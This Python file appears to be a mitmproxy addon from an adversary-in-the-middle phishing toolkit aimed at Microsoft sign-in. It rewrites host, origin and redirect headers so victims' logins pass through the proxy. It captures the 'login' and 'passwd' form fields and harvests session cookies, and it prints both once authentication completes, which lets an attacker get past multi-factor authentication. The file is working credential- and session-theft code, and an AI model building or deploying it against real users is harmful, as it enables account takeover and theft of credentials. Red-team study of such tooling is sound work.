"""
Modifier Addon
"""

from __future__ import annotations

import json
import logging
from http.cookies import SimpleCookie

from mitmproxy.http import HTTPFlow

from aitm.aitm_config import config
from aitm.helpers import cookies, requests, responses

logger = logging.getLogger(__name__)


class ModifierAddon:
    """
    Addon Class for mitmproxy
    """

    credentials: dict[str, str] = {}
    simple_cookie: SimpleCookie = SimpleCookie()

    def request(self, flow: HTTPFlow) -> None:
        """
        Method which mitmproxy calls for each request
        """
        requests.modify_header(flow, "Host")
        requests.modify_header(flow, "Referer")
        requests.modify_header(flow, "Origin")
        requests.modify_header(flow, "Location")
        requests.modify_query(flow, "redirect_uri")

        if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
            flow.request.query["claims"] = config.mfa_claim
        if flow.request.path.startswith("/common/login"):
            self.credentials["login"] = flow.request.urlencoded_form["login"]
            self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]

    def response(self, flow: HTTPFlow) -> None:
        """
        Method which mitmproxy calls for each response
        """
        responses.modify_header(flow, "Location")
        responses.save_cookies(flow, self.simple_cookie)
        responses.modify_cookies(flow)
        responses.modify_content(flow)

        if flow.request.path in config.auth_url:
            print(json.dumps(cookies.parse_cookies(self.simple_cookie)))
            print(self.credentials)
